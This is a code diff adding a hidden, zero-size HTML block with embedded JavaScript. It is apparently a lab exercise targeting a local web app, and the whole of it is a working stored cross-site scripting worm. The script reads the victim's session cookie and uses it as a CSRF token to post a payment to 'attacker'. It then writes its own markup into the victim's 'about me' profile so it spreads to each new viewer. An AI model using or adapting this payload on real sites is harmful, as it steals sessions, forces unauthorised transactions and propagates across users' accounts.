@@ -1,0 +1,38 @@
+<div class="temp_attack" id = "toabm" style="height:0px; width:0px; border:0px;">
+<script defer>
+
+function getCookie(cname) {
+	  var name = cname + "=";
+	  var decodedCookie = decodeURIComponent(document.cookie);
+	  var ca = decodedCookie.split(';');
+	  for(var i = 0; i <ca.length; i++) {
+	    var c = ca[i];
+	    while (c.charAt(0) == ' ') {
+	      c = c.substring(1);
+	    }
+	    if (c.indexOf(name) == 0) {
+        	return c.substring(name.length, c.length);
+	    }
+	  }
+      return "";                       
+	}
+
+var http = new XMLHttpRequest();
+var url = 'http://localhost:8080/pay';
+var params = 'amount=1&recipient=attacker&csrf-id=' + getCookie('session');
+
+http.open('POST', url, false);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params);
+
+var httpabm = new XMLHttpRequest();
+var urlabm = 'http://localhost:8080/aboutme';
+var FD  = new FormData();
+FD.append('aboutme', document.getElementById("toabm").outerHTML);
+
+httpabm.open('POST', urlabm, false);
+httpabm.send(FD);
+
+</script>
+
+</div>
